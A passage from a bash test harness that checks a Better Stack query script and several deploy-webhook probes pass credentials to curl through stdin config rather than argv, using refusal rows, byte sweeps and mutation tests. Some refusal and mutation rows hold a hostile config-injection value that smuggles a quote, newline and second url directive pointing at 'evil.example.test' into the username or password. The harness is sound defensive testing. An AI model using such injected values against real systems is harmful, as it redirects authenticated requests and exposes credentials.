  [[ "$(cat "$c.userpwd" 2>/dev/null; printf x)" == "${BS_PAIR}x" ]] || BS_BAD+=" userpwd-differs"
  # the SQL is NOT a secret and stays an argument (-d), and the request is a POST to the pinned host
  [[ "$(tr '\0' '\n' < "$c.argv" | grep -cxF -- "$BS_SQL" || true)" == 1 ]] || BS_BAD+=" sql-not-an-argument"
  [[ "$(tr '\0' '\n' < "$c.argv" | grep -cF -- "https://$BS_HOST?" || true)" == 1 ]] || BS_BAD+=" url"
  [[ "$(grep -cF -- "$BS_PASS" "$row/stdout" "$row/stderr" | awk -F: '{n+=$NF} END {print n+0}')" == 0 ]] || BS_BAD+=" value-in-output"
  [[ "$(grep -cF -- 'SOLEUR_CREDENTIAL_REFUSED' "$row/stderr" || true)" == 0 ]] || BS_BAD+=" marker-on-success"
  [[ ! -e "$row/shim/unmodelled" ]] || BS_BAD+=" unmodelled-flag"
  return 0
}

# --- the well-formed call: realistic pair, auth-gated shim -----------------------------------------------
bs_run bs-ok "$BS_USER" "$BS_PASS"; bs_ok_call bs-ok
if [[ -z "$BS_BAD" ]]; then row "betterstack-query: a well-formed pair reaches curl as exactly one 'user = \"...\"' stdin line; no -u/--user/--user= token and neither value in argv; the SQL stays a -d argument; the shim authenticates it" ok
else row "betterstack-query: a well-formed pair reaches curl as exactly one 'user = \"...\"' stdin line; no -u/--user/--user= token and neither value in argv; the SQL stays a -d argument; the shim authenticates it" fail "checks:$BS_BAD"; fi
# must-PASS, not the canonical: the password carries `$ # ; ! + / = : %`, checked by USERPWD equality in the shim AND by replaying the
# recorded stdin through the REAL curl (CURLOPT_USERPWD equal, one CURLOPT_URL).
c="$ROWS/bs-ok/shim/calls/1.stdin"
bs_replay="$BSDIR/replay.c"; rm -f "$bs_replay"
"$REAL_CURL" --disable --noproxy '*' -sS --max-time 3 --libcurl "$bs_replay" --config - http://127.0.0.1:9/ < "$c" >/dev/null 2>&1 || true
bs_res="$("$REAL_PY" -I "$BS_DEC" "$bs_replay" "$(printf '%s' "$BS_PAIR" | od -An -v -tx1 | tr -d ' \n')" 2>/dev/null || true)"
if [[ "$bs_res" == "urls=1 ok=1" && "$(grep -c '[$#;!]' <<< "$BS_PASS" || true)" == 1 ]]; then
  row "betterstack-query: a real-shaped password containing \$ # ; ! + / = : % is delivered intact (recorded stdin replayed through real curl: one URL, USERPWD equal)" ok
else row "betterstack-query: a real-shaped password containing \$ # ; ! + / = : % is delivered intact (recorded stdin replayed through real curl: one URL, USERPWD equal)" fail "replay=$bs_res"; fi
# the same guard sits on mode 2 (convenience flags): one run_sql, both modes
BS_ARGS=(--since 1h --no-archive); bs_run bs-ok-mode2 "$BS_USER" "$BS_PASS"
BS_ARGS=("$BS_SQL")
if [[ "$BS_RC" -eq 0 && "$(bk_calls "$ROWS/bs-ok-mode2")" == 1 && ! -e "$ROWS/bs-ok-mode2/shim/calls/1.userflag" \
      && "$(cat "$ROWS/bs-ok-mode2/shim/calls/1.userpwd"; printf x)" == "${BS_PAIR}x" ]]; then
  row "betterstack-query: mode 2 (convenience flags) sends the same single stdin user line and no -u" ok
else row "betterstack-query: mode 2 (convenience flags) sends the same single stdin user line and no -u" fail "rc=$BS_RC"; fi

# --- refusal rows: every one keys on the MARKER line (and its reason), the exit code is only one of the checks ---
BS_CAN="SYNTHBSCANARY$BS_HEX"
bs_refuse_row() { # <label> <user> <pass> <reason> <variable> [canary]
  bs_run "bsr-$1" "$2" "$3"; bs_refusal "bsr-$1" "$4" "$5" "${6:-$BS_CAN}"
  if [[ -z "$BS_BAD" ]]; then row "betterstack-query refuses $1: exit 2, zero curl calls, marker once (reason $4), one stderr line naming only $5, value absent from output" ok
  else row "betterstack-query refuses $1: exit 2, zero curl calls, marker once (reason $4), one stderr line naming only $5, value absent from output" fail "checks:$BS_BAD"; fi
}
bs_refuse_row "a double quote in the username" "${BS_CAN}u\"x" "$BS_PASS" token_shape BETTERSTACK_QUERY_USERNAME
bs_refuse_row "a double quote in the password" "$BS_USER" "${BS_CAN}p\"x" token_shape BETTERSTACK_QUERY_PASSWORD
bs_refuse_row "a backslash in the username" "${BS_CAN}u\\x" "$BS_PASS" token_shape BETTERSTACK_QUERY_USERNAME
bs_refuse_row "a backslash in the password" "$BS_USER" "${BS_CAN}p\\x" token_shape BETTERSTACK_QUERY_PASSWORD
bs_refuse_row "a carriage return in the password" "$BS_USER" "${BS_CAN}p"$'\r'"x" control_char BETTERSTACK_QUERY_PASSWORD
bs_refuse_row "a carriage return in the username" "${BS_CAN}u"$'\r'"x" "$BS_PASS" control_char BETTERSTACK_QUERY_USERNAME
bs_refuse_row "a line feed in the password" "$BS_USER" "${BS_CAN}p"$'\n'"x" control_char BETTERSTACK_QUERY_PASSWORD
bs_refuse_row "a line feed in the username" "${BS_CAN}u"$'\n'"x" "$BS_PASS" control_char BETTERSTACK_QUERY_USERNAME
bs_refuse_row "a tab in the password" "$BS_USER" "${BS_CAN}p"$'\t'"x" control_char BETTERSTACK_QUERY_PASSWORD
bs_refuse_row "a tab in the username" "${BS_CAN}u"$'\t'"x" "$BS_PASS" control_char BETTERSTACK_QUERY_USERNAME
bs_refuse_row "a colon in the username" "${BS_CAN}u:x" "$BS_PASS" token_shape BETTERSTACK_QUERY_USERNAME
bs_refuse_row "a quote together with a control character (control_char wins the reason)" "$BS_USER" "${BS_CAN}p\"x"$'\r' control_char BETTERSTACK_QUERY_PASSWORD
bs_refuse_row "the hostile config-injection value (quote, newline, a second url directive)" "$BS_USER" "${BS_CAN}x\"$(printf '\nurl = "http://evil.example.test/second')" control_char BETTERSTACK_QUERY_PASSWORD
bs_refuse_row "the hostile config-injection value in the username" "${BS_CAN}x\"$(printf '\nurl = "http://evil.example.test/second')" "$BS_PASS" control_char BETTERSTACK_QUERY_USERNAME
# a colon in the PASSWORD is legal (only the first colon separates): it is the must-PASS side of the same split, covered by bs-ok above.
BS_ARGS=(--since 1h --no-archive); bs_run bsr-mode2 "$BS_USER" "${BS_CAN}p\"x"; bs_refusal bsr-mode2 token_shape BETTERSTACK_QUERY_PASSWORD "$BS_CAN"; BS_ARGS=("$BS_SQL")
if [[ -z "$BS_BAD" ]]; then row "betterstack-query refuses a double quote in the password in mode 2 as well: exit 2, zero calls, marker once" ok
else row "betterstack-query refuses a double quote in the password in mode 2 as well: exit 2, zero calls, marker once" fail "checks:$BS_BAD"; fi
# the empty-credential case is the script's EXISTING exit 3 ("credentials absent", before run_sql): pinned, with no marker and no call
for cred in "empty username:|$BS_PASS" "empty password:$BS_USER|" "both empty:|"; do
  clabel="${cred%%:*}"; cval="${cred#*:}"; cu="${cval%%|*}"; cp="${cval#*|}"
  bs_run "bsr-$clabel" "$cu" "$cp"
  if [[ "$BS_RC" -eq 3 && "$(bk_calls "$ROWS/bsr-$clabel")" == 0 && "$(grep -cF 'SOLEUR_CREDENTIAL_REFUSED' "$ROWS/bsr-$clabel/stderr" || true)" == 0 ]] \
     && grep -qF 'not set' "$ROWS/bsr-$clabel/stderr"; then
    row "betterstack-query: $clabel stays the existing exit 3 (credentials absent, before run_sql): zero calls and no refusal marker" ok
  else row "betterstack-query: $clabel stays the existing exit 3 (credentials absent, before run_sql): zero calls and no refusal marker" fail "rc=$BS_RC"; fi
done

# --- the byte sweep: bytes 0x01..0x7f in each position through the REAL curl (oracle) and then the REAL script ---
# Expected refusal set = every control character, the double quote, the backslash and (username only) the colon. The oracle
# must show EXACTLY the quote, the backslash and the newline changing parsing, so the guard is a superset of what real curl needs.
bs_sweep() { # <user|pass> -> BS_SW_N BS_SW_ORACLE_CHANGED BS_SW_REFUSED BS_SW_MISS BS_SW_BADPASS
  local pos="$1" b hx ch v u p pair want got
  BS_SW_N=0; BS_SW_ORACLE_CHANGED=""; BS_SW_REFUSED=""; BS_SW_MISS=""; BS_SW_BADPASS=""
  for b in $(seq 1 127); do
    printf -v hx '%02x' "$b"; printf -v ch "\\x$hx"
    v="Q${ch}R"
    if [[ "$pos" == user ]]; then u="$v"; p="pw-sweep"; else u="usr-sweep"; p="$v"; fi
    pair="$u:$p"
    bs_oracle "$pair"
    bs_run "bsw-$pos-$hx" "$u" "$p"
    BS_SW_N=$((BS_SW_N + 1))
    if [[ "$BS_OR_URLS" != 1 || "$BS_OR_OK" != 1 ]]; then BS_SW_ORACLE_CHANGED+=" $hx"; fi
    if [[ "$BS_RC" -eq 2 && "$(bk_calls "$ROWS/bsw-$pos-$hx")" == 0 ]]; then
      BS_SW_REFUSED+=" $hx"
    else
      # not refused: it must have reached the shim, and the shim must have parsed EXACTLY this pair (no -u, no INJECTED)
      got="$(cat "$ROWS/bsw-$pos-$hx/shim/calls/1.userpwd" 2>/dev/null; printf x)"
      if [[ "$(bk_calls "$ROWS/bsw-$pos-$hx")" != 1 || -e "$ROWS/bsw-$pos-$hx/shim/calls/1.injected" || -e "$ROWS/bsw-$pos-$hx/shim/calls/1.userflag" || "$got" != "${pair}x" ]]; then
        BS_SW_BADPASS+=" $hx"
      fi
    fi
  done
  for hx in $BS_SW_ORACLE_CHANGED; do [[ " $BS_SW_REFUSED " == *" $hx "* ]] || BS_SW_MISS+=" $hx"; done
}
BS_SW_EXPECT_PW="$(for b in $(seq 1 127); do case "$b" in 34|92|127) printf '%02x\n' "$b" ;; *) [[ "$b" -le 31 ]] && printf '%02x\n' "$b" ;; esac; done | paste -sd' ' -)"
BS_SW_EXPECT_USER="$(for b in $(seq 1 127); do case "$b" in 34|92|58|127) printf '%02x\n' "$b" ;; *) [[ "$b" -le 31 ]] && printf '%02x\n' "$b" ;; esac; done | paste -sd' ' -)"
for pos in user pass; do
  bs_sweep "$pos"
  want="$BS_SW_EXPECT_PW"; [[ "$pos" == user ]] && want="$BS_SW_EXPECT_USER"
  gotset="$(printf '%s\n' $BS_SW_REFUSED | paste -sd' ' -)"
  if [[ "$BS_SW_N" == 127 && "$(printf '%s\n' $BS_SW_ORACLE_CHANGED | paste -sd' ' -)" == "0a 22 5c" && -z "$BS_SW_MISS" ]]; then
    row "byte sweep ($pos position, 0x01-0x7f x real curl): exactly 0x0a, 0x22 and 0x5c change config parsing, and the script refuses every one of them" ok
  else row "byte sweep ($pos position, 0x01-0x7f x real curl): exactly 0x0a, 0x22 and 0x5c change config parsing, and the script refuses every one of them" fail "n=$BS_SW_N oracle-changed:$BS_SW_ORACLE_CHANGED missed:$BS_SW_MISS"; fi
  if [[ "$gotset" == "$want" && -z "$BS_SW_BADPASS" ]]; then
    row "byte sweep ($pos position): the refusal set is exactly the control characters, the quote, the backslash$([[ "$pos" == user ]] && printf ' and the colon'); every other byte reaches curl intact as one user line" ok
  else row "byte sweep ($pos position): the refusal set is exactly the control characters, the quote, the backslash$([[ "$pos" == user ]] && printf ' and the colon'); every other byte reaches curl intact as one user line" fail "refused:[$gotset] want:[$want] mangled-or-missing:$BS_SW_BADPASS"; fi
done

# --- static rows over the real script ---------------------------------------------------------------------
BS_RUNSQL="$BSDIR/run_sql.txt"; awk '/^run_sql\(\) \{$/{f=1} f{print} f&&/^}$/{exit}' "$BSQ" > "$BS_RUNSQL"
bs_code="$(grep -vE '^[[:space:]]*#' "$BSQ")"
n_ut="$(grep -cE -- '(^|[[:space:]"])(-u|--user|--user=[^[:space:]]*)([[:space:]"]|$)' <<< "$bs_code" || true)"
if [[ -s "$BS_RUNSQL" && "$n_ut" == 0 ]]; then row "static: no -u / --user / --user= token remains in any non-comment line of betterstack-query.sh" ok
else row "static: no -u / --user / --user= token remains in any non-comment line of betterstack-query.sh" fail "run_sql_bytes=$(wc -c < "$BS_RUNSQL") user-tokens=$n_ut"; fi
bs_first="$(grep -m1 'curl ' "$BS_RUNSQL" || true)"
if [[ "$bs_first" == *"curl --disable --noproxy '*'"* && "$(grep -c -- '--config - < <(printf '"'"'user = "%s:%s"\\n'"'"'' "$BS_RUNSQL" || true)" == 1 ]]; then
  row "static: run_sql keeps --disable --noproxy '*' first and feeds --config - from a process substitution (never printf | curl)" ok
else row "static: run_sql keeps --disable --noproxy '*' first and feeds --config - from a process substitution (never printf | curl)" fail "first=$bs_first"; fi
bs_g_ln="$(grep -n -m1 '_bs_credential_guard$' "$BS_RUNSQL" | cut -d: -f1)"; bs_c_ln="$(grep -n -m1 'curl --disable' "$BS_RUNSQL" | cut -d: -f1)"
if [[ -n "$bs_g_ln" && -n "$bs_c_ln" && "$bs_g_ln" -lt "$bs_c_ln" ]]; then row "static: the credential guard is called in run_sql before the curl call" ok
else row "static: the credential guard is called in run_sql before the curl call" fail "guard=$bs_g_ln curl=$bs_c_ln"; fi

# --- MUTATIONS of the real script: each must turn the named refusal row RED ----------------------------
bs_mut() { # <mutant> <from> <to> -> sets BS_SCRIPT to the mutated copy
  BS_SCRIPT="$BSDIR/mut-$1.sh"; mutated_copy "$REPO_ROOT/$BSQ" "$BS_SCRIPT" "$2" "$3"
}
BS_GUARD_CALL='_bs_credential_guard
  curl --disable'
bs_mut noguard "$BS_GUARD_CALL" ':
  curl --disable'
bs_run bsm-noguard "$BS_USER" "${BS_CAN}x\"$(printf '\nurl = "http://evil.example.test/second')"
bs_refusal bsm-noguard control_char BETTERSTACK_QUERY_PASSWORD "$BS_CAN"
if [[ "$(bk_calls "$ROWS/bsm-noguard")" == 1 && -s "$ROWS/bsm-noguard/shim/calls/1.injected" && " $BS_BAD " == *" curl-called "* && " $BS_BAD " == *" marker-line "* ]]; then
  row "mutation: the guard call removed lets the hostile value reach curl and the shim records INJECTED (the refusal row goes RED on curl-called and marker-line)" ok
else row "mutation: the guard call removed lets the hostile value reach curl and the shim records INJECTED (the refusal row goes RED on curl-called and marker-line)" fail "calls=$(bk_calls "$ROWS/bsm-noguard") checks:$BS_BAD"; fi
bs_mut noquote '*\"*|*\\*) _bs_refuse BETTERSTACK_QUERY_PASSWORD token_shape' '*\\*) _bs_refuse BETTERSTACK_QUERY_PASSWORD token_shape'
bs_run bsm-noquote "$BS_USER" "${BS_CAN}p\"x"; bs_refusal bsm-noquote token_shape BETTERSTACK_QUERY_PASSWORD "$BS_CAN"
if [[ " $BS_BAD " == *" curl-called "* && " $BS_BAD " == *" marker-line "* ]]; then row "mutation: dropping the quote check from the password arm turns the password-quote row RED" ok
else row "mutation: dropping the quote check from the password arm turns the password-quote row RED" fail "checks:$BS_BAD"; fi
bs_mut nobackslash '*\"*|*\\*) _bs_refuse BETTERSTACK_QUERY_PASSWORD token_shape' '*\"*) _bs_refuse BETTERSTACK_QUERY_PASSWORD token_shape'
bs_run bsm-nobackslash "$BS_USER" "${BS_CAN}p\\x"; bs_refusal bsm-nobackslash token_shape BETTERSTACK_QUERY_PASSWORD "$BS_CAN"
if [[ " $BS_BAD " == *" curl-called "* && " $BS_BAD " == *" marker-line "* ]]; then row "mutation: dropping the backslash check from the password arm turns the password-backslash row RED" ok
else row "mutation: dropping the backslash check from the password arm turns the password-backslash row RED" fail "checks:$BS_BAD"; fi
bs_mut nocolon "''|*:*|*\\\"*|*\\\\*) _bs_refuse BETTERSTACK_QUERY_USERNAME token_shape" "''|*\\\"*|*\\\\*) _bs_refuse BETTERSTACK_QUERY_USERNAME token_shape"
bs_run bsm-nocolon "${BS_CAN}u:x" "$BS_PASS"; bs_refusal bsm-nocolon token_shape BETTERSTACK_QUERY_USERNAME "$BS_CAN"
if [[ " $BS_BAD " == *" curl-called "* && " $BS_BAD " == *" marker-line "* ]]; then row "mutation: dropping the colon check from the username arm turns the colon-in-username row RED" ok
else row "mutation: dropping the colon check from the username arm turns the colon-in-username row RED" fail "checks:$BS_BAD"; fi
bs_mut nocntrl '*[[:cntrl:]]*) _bs_refuse BETTERSTACK_QUERY_PASSWORD control_char' '*) :'
bs_run bsm-nocntrl "$BS_USER" "${BS_CAN}p"$'\t'"x"; bs_refusal bsm-nocntrl control_char BETTERSTACK_QUERY_PASSWORD "$BS_CAN"
if [[ " $BS_BAD " == *" curl-called "* && " $BS_BAD " == *" marker-line "* ]]; then row "mutation: dropping the control-character check from the password arm turns the tab-in-password row RED" ok
else row "mutation: dropping the control-character check from the password arm turns the tab-in-password row RED" fail "checks:$BS_BAD"; fi
bs_mut exit1 'exit 2
}' 'exit 1
}'
bs_run bsm-exit1 "$BS_USER" "${BS_CAN}p\"x"; bs_refusal bsm-exit1 token_shape BETTERSTACK_QUERY_PASSWORD "$BS_CAN"
if [[ " $BS_BAD " == *" rc=1 "* && " $BS_BAD " != *" curl-called "* ]]; then row "mutation: a refusal that exits 1 (the reader-exit-1 class that blames DOPPLER_TOKEN) turns the refusal row RED on the exit code alone" ok
else row "mutation: a refusal that exits 1 (the reader-exit-1 class that blames DOPPLER_TOKEN) turns the refusal row RED on the exit code alone" fail "checks:$BS_BAD"; fi
bs_mut argvback '--config - < <(printf '"'"'user = "%s:%s"\n'"'"' "$BETTERSTACK_QUERY_USERNAME" "$BETTERSTACK_QUERY_PASSWORD")' '-u "${BETTERSTACK_QUERY_USERNAME}:${BETTERSTACK_QUERY_PASSWORD}"'
bs_run bsm-argvback "$BS_USER" "$BS_PASS"; bs_ok_call bsm-argvback
if [[ " $BS_BAD " == *" user-flag-in-argv "* && " $BS_BAD " == *" user-token-in-argv "* && " $BS_BAD " == *" value-in-argv "* ]]; then
  row "mutation: the pair put back on curl's argv (-u) turns the well-formed row RED on the user flag and on both values in argv" ok
else row "mutation: the pair put back on curl's argv (-u) turns the well-formed row RED on the user flag and on both values in argv" fail "checks:$BS_BAD"; fi
BS_SCRIPT="$REPO_ROOT/$BSQ"
echo "=== stage S2-B: Better Stack reader (basic auth off argv) done ==="

# =====================================================================================
# STAGE S2-C: the deploy-webhook triple (X-Signature-256 + the Cloudflare Access pair) off curl argv in
# scripts/check-deploy-script-parity.sh and the four followthrough probes. Same canonical HMAC snippet as the
# cutover copies (key on the python3 child's ENVIRONMENT only), `_bearer_ok` (a copy of the cutover function) on both
# Cloudflare Access values, `--disable --noproxy '*'` first, `--config -` with three `header = "..."` lines on a
# process substitution. A refusal sends nothing and prints the value-free marker; the exit code is the SURFACE'S
# non-verdict code (2 for the parity script and the two probes whose contract reads 2 as TRANSIENT; 3 for the soak
# probe, whose contract reserves 2 for a reading), never 1 (a FAIL verdict, a tracker reopen).
#
# The instrument is the `hmac-cf` auth profile of the shared curl shim. It is NOT shape-only: it RECOMPUTES the digest
# over the recorded request body with the fixture key through the real openssl (the independent oracle) and compares both
# Cloudflare Access values exactly, so a hard-coded 64-zero digest, a wrong key or a stale value returns 401 and the probe
# cannot reach its success outcome. Controls CHM1..CHM6 prove that before any probe is judged by it.
# =====================================================================================
sed -i "s|@REAL_OSSL@|${REAL_OSSL}|" "$SHIMDIR/curl"
HMX="$TMPD/hmx"; assert_fixture_dir "$HMX"; mkdir -p "$HMX"
HMX_RAND="$(od -An -N8 -tx1 /dev/urandom | tr -d ' \n')"
HMX_KEY="whkey-$HMX_RAND"
HMX_CFID="cfid-$HMX_RAND"
HMX_CFSEC="cfsec-$HMX_RAND"
HM_PROG="${HM_CANON#*python3 -I -c \'}"; HM_PROG="${HM_PROG%\'}"            # the python program, byte for byte
HM_CANON_DEPLOY="HMAC_KEY=\"\$WEBHOOK_DEPLOY_SECRET\" python3 -I -c '${HM_PROG}'"   # the probe form: the key variable differs, the program does not
HM_BEARER_FN="$(grep -m1 '^_bearer_ok() {' "$CUT")"
[[ -n "$HM_PROG" && "$HM_CANON_DEPLOY" == *"hashlib.sha256"* && -n "$HM_BEARER_FN" ]] || fatal "stage S2-C: could not derive the canonical program or the _bearer_ok function"
HMX_FMT='header = "X-Signature-256: sha256=%s"\nheader = "CF-Access-Client-Id: %s"\nheader = "CF-Access-Client-Secret: %s"\n'

# ---- the HMAC shim controls -------------------------------------------------------------------------------
hmx_status() { # <rowname> <sig> <cfid> <cfsec> [SHIM_HMAC_KEY] -> HMX_ST (the shim's status for that request)
  local row="$ROWS/$1"; assert_fixture_dir "$row"; mkdir -p "$row/shim"
  HMX_ST="$( cd "$row" && env -i PATH="$SHIMDIR:$REALBIN" SHIM_DIR="$row/shim" SHIM_AUTH=hmac-cf SHIM_HMAC_KEY="${5:-$HMX_KEY}" SHIM_CF_ID="$HMX_CFID" SHIM_CF_SECRET="$HMX_CFSEC" \
      "$SHIMDIR/curl" -sS -o "$row/body" -w '%{http_code}' --config - https://deploy.soleur.ai/hooks/x < <(printf "$HMX_FMT" "$2" "$3" "$4") 2>/dev/null )"
}
hmx_sig() { printf '%s' "$2" | "$REAL_OSSL" dgst -sha256 -hmac "$1" | sed 's/.*= //'; }  # <key> <body>
HMX_GOOD="$(hmx_sig "$HMX_KEY" '')"
hmx_status chm1 "$HMX_GOOD" "$HMX_CFID" "$HMX_CFSEC"
[[ "$HMX_ST" == 200 ]] || fatal "CHM1 the hmac-cf profile rejected a correct digest and Cloudflare Access pair (status $HMX_ST)"
row "control CHM1: the hmac-cf shim profile answers 200 for the digest recomputed over the empty body with the fixture key and the exact Cloudflare Access pair" ok
hmx_status chm2 "$(hmx_sig "other-key-$HMX_RAND" '')" "$HMX_CFID" "$HMX_CFSEC"
[[ "$HMX_ST" == 401 ]] || fatal "CHM2 a digest made with the wrong key was accepted (status $HMX_ST): the profile is shape-only"
row "control CHM2: a digest computed with the wrong key is 401 (the profile recomputes, it does not check shape)" ok
hmx_status chm3 "$(printf '%064d' 0)" "$HMX_CFID" "$HMX_CFSEC"
[[ "$HMX_ST" == 401 ]] || fatal "CHM3 a hard-coded 64-zero digest was accepted (status $HMX_ST)"
row "control CHM3: a hard-coded 64-zero digest is 401" ok
hmx_status chm4 "$(hmx_sig "$HMX_KEY" 'a body the request does not carry')" "$HMX_CFID" "$HMX_CFSEC"
[[ "$HMX_ST" == 401 ]] || fatal "CHM4 a digest over a different body was accepted (status $HMX_ST)"
row "control CHM4: a digest computed over a different body than the request's own (empty) body is 401" ok
hmx_status chm5 "$HMX_GOOD" "${HMX_CFID}x" "$HMX_CFSEC"; hmx_st5="$HMX_ST"
hmx_status chm6 "$HMX_GOOD" "$HMX_CFID" "${HMX_CFSEC}x"; hmx_st6="$HMX_ST"
[[ "$hmx_st5" == 401 && "$hmx_st6" == 401 ]] || fatal "CHM5/6 a wrong Cloudflare Access value was accepted (id $hmx_st5, secret $hmx_st6)"
row "control CHM5: a wrong Cloudflare Access client id or secret is 401 (both compared exactly)" ok

# ---- the audit of the five converted files: ONE function, so the real rows and the mutant rows judge identically ----
# HM5_BAD names the failed facets: snippet (the HMAC line is not the canonical program with the deploy key, exactly once),
# guard (no `|| VAR=""` after it), hexcheck (no ^[0-9a-f]{64}$ test), openssl (an openssl/-hmac token on a non-comment line),
# bearer (the _bearer_ok function differs from the cutover's, or is not applied to exactly two values), config (the curl command
# is not `curl --disable --noproxy '*'` ... `--config -` fed by the three-line process substitution, or a -H credential header
# is left), preamble (no `case "$-"` xtrace refusal).
HM5_CFG_LIT="--config - < <(printf 'header = \"X-Signature-256: sha256=%s\"\\nheader = \"CF-Access-Client-Id: %s\"\\nheader = \"CF-Access-Client-Secret: %s\"\\n'"
hm5_audit() { # <file>
  local f="$1" code line n
  HM5_BAD=""
  code="$(grep -vE '^[[:space:]]*#' "$f")"
  n="$(grep -cF -- "$HM_CANON_DEPLOY" <<< "$code" || true)"
  [[ "$n" == 1 && "$(grep -cF 'HMAC_KEY="$WEBHOOK_DEPLOY_SECRET" python3' <<< "$code" || true)" == 1 ]] || HM5_BAD+=" snippet"
  line="$(grep -F -e 'HMAC_KEY="$WEBHOOK_DEPLOY_SECRET" python3' <<< "$code" | head -n1)"
  [[ "$line" =~ \|\|\ [A-Za-z_]+=\"\"[[:space:]]*$ ]] || HM5_BAD+=" guard"
  [[ "$(grep -cF -e '^[0-9a-f]{64}$' <<< "$code" || true)" == 1 ]] || HM5_BAD+=" hexcheck"
  [[ "$(grep -cE -e 'openssl|-hmac|-macopt' <<< "$code" || true)" == 0 ]] || HM5_BAD+=" openssl"
  [[ "$(sed 's/^[[:space:]]*//' "$f" | grep -cxF -- "$HM_BEARER_FN" || true)" == 1 && "$(grep -oE '_bearer_ok "' <<< "$code" | grep -c . || true)" == 2 ]] || HM5_BAD+=" bearer"
  # exactly ONE curl command in the file and it is the disable form: `-ge 1` on the disable form let a second, flag-less `curl` (a proxy-honouring, rc-honouring
  # call outside the config-on-stdin shape) ride along; the count of `curl` words on non-comment lines is therefore held equal to the count of the disable form
  [[ "$(grep -cF -e "curl --disable --noproxy '*'" <<< "$code" || true)" == 1 && "$(grep -cE -e '(^|[^A-Za-z0-9_./-])curl([^A-Za-z0-9_-]|$)' <<< "$code" || true)" == 1 \
     && "$(grep -cF -e "$HM5_CFG_LIT" <<< "$code" || true)" == 1 \
     && "$(grep -cE -e '-H "(X-Signature-256|CF-Access-Client)' <<< "$code" || true)" == 0 ]] || HM5_BAD+=" config"
  [[ "$(grep -cF -e 'case "$-" in' <<< "$code" || true)" -ge 1 ]] || HM5_BAD+=" preamble"
  return 0
}
HM5_FILES="scripts/check-deploy-script-parity.sh
scripts/followthroughs/canary-promotion-5875.sh
scripts/followthroughs/infra-config-activation-7220.sh
scripts/followthroughs/infra-config-fatal-channel-7220.sh
scripts/followthroughs/inngest-soak-6178.sh"
while IFS= read -r hf; do
  hm5_audit "$hf"
  if [[ -z "$HM5_BAD" ]]; then row "$hf: the canonical HMAC program with the deploy key (guarded, 64-hex checked), _bearer_ok on both Cloudflare Access values, curl --disable --noproxy '*' with the three header lines on a process substitution, no openssl, xtrace refusal" ok
  else row "$hf: the canonical HMAC program with the deploy key (guarded, 64-hex checked), _bearer_ok on both Cloudflare Access values, curl --disable --noproxy '*' with the three header lines on a process substitution, no openssl, xtrace refusal" fail "failed facets:$HM5_BAD"; fi
done <<< "$HM5_FILES"
hm_hmacflag="$(git grep -nE -- '-hmac' -- scripts/check-deploy-script-parity.sh scripts/followthroughs/canary-promotion-5875.sh scripts/followthroughs/infra-config-activation-7220.sh scripts/followthroughs/infra-config-fatal-channel-7220.sh scripts/followthroughs/inngest-soak-6178.sh | grep -vE '^[^:]+:[0-9]+:[[:space:]]*#' | grep -c . || true)"
if [[ "$hm_hmacflag" == 0 ]]; then row "census: no -hmac operand remains in the parity script or the four probes (the key is on no openssl argv)" ok
else row "census: no -hmac operand remains in the parity script or the four probes (the key is on no openssl argv)" fail "$hm_hmacflag non-comment -hmac lines"; fi

# ---- per-script mutants of the audit: one mutant per script and kind, each asserting WHICH facet fails and WHICH LINE it touched ----
hm5_mut() { # <file> <label> <from> <to> -> HM5_MUT (path); fatal when the literal is absent
  HM5_MUT="$HMX/mut-$(basename "$1" .sh)-$2.sh"; mutated_copy "$REPO_ROOT/$1" "$HM5_MUT" "$3" "$4"
}
while IFS= read -r hf; do
  base="$(basename "$hf" .sh)"
  hm_ln="$(grep -n -F 'HMAC_KEY="$WEBHOOK_DEPLOY_SECRET" python3' "$hf" | head -n1 | cut -d: -f1)"
  hm5_mut "$hf" noi 'python3 -I -c' 'python3 -c'; hm5_audit "$HM5_MUT"
  if [[ "$HM5_BAD" == " snippet" && "$(hm_touched "$hf" "$HM5_MUT")" == "${hm_ln}c${hm_ln}" ]]; then row "mutation ($base): dropping -I from the HMAC line (line $hm_ln only) fails exactly the snippet facet" ok
  else row "mutation ($base): dropping -I from the HMAC line (line $hm_ln only) fails exactly the snippet facet" fail "facets:$HM5_BAD touched:$(hm_touched "$hf" "$HM5_MUT") want:${hm_ln}c${hm_ln}"; fi
  hm_ln="$(grep -n -F -e '^[0-9a-f]{64}$' "$hf" | head -n1 | cut -d: -f1)"
  hm5_mut "$hf" nohex '^[0-9a-f]{64}$' '^[0-9a-f]*$'; hm5_audit "$HM5_MUT"
  if [[ "$HM5_BAD" == " hexcheck" && "$(hm_touched "$hf" "$HM5_MUT")" == "${hm_ln}c${hm_ln}" ]]; then row "mutation ($base): weakening the 64-hex signature check (line $hm_ln only) fails exactly the hexcheck facet" ok
  else row "mutation ($base): weakening the 64-hex signature check (line $hm_ln only) fails exactly the hexcheck facet" fail "facets:$HM5_BAD touched:$(hm_touched "$hf" "$HM5_MUT") want:${hm_ln}c${hm_ln}"; fi
  hm_ln="$(grep -n -F -- "$HM_BEARER_FN" "$hf" | head -n1 | cut -d: -f1)"
  hm5_mut "$hf" bearer '*[!A-Za-z0-9._~+/=-]*) return 1' '*[!A-Za-z0-9._~+/=\"-]*) return 1'; hm5_audit "$HM5_MUT"
  if [[ "$HM5_BAD" == " bearer" && "$(hm_touched "$hf" "$HM5_MUT")" == "${hm_ln}c${hm_ln}" ]]; then row "mutation ($base): admitting the double quote in _bearer_ok (line $hm_ln only) fails exactly the bearer facet" ok
  else row "mutation ($base): admitting the double quote in _bearer_ok (line $hm_ln only) fails exactly the bearer facet" fail "facets:$HM5_BAD touched:$(hm_touched "$hf" "$HM5_MUT") want:${hm_ln}c${hm_ln}"; fi
done <<< "$HM5_FILES"
# The four facets the mutants above leave unseen (guard, openssl, config, preamble): a facet clause deleted from hm5_audit kept every file row green.
# One mutant per facet per file, each failing EXACTLY that facet. The openssl and config mutants append one non-comment line; the guard and
# preamble mutants rewrite the file's own text (FATAL when the anchor is absent, so a mutant that did not land cannot read as a pass).
hm5_facet_mut() { # <file> <facet> -> HM5_MUT
  local f="$REPO_ROOT/$1" text i ln
  local -a tl
  HM5_MUT="$HMX/facet-$(basename "$1" .sh)-$2.sh"; assert_fixture_dir "$HM5_MUT"
  case "$2" in
    openssl)  { cat "$f"; printf '%s\n' ': openssl'; } > "$HM5_MUT" ;;
    config)   { cat "$f"; printf '%s\n' ': -H "X-Signature-256: x"'; } > "$HM5_MUT" ;;
    # the other conjuncts and alternatives of the config facet, each alone: the second alternative of the -H test, the missing --disable, the header
    # printf that is absent, and the header printf that appears twice (the count is exactly 1, not at least 1 and not at least 0)
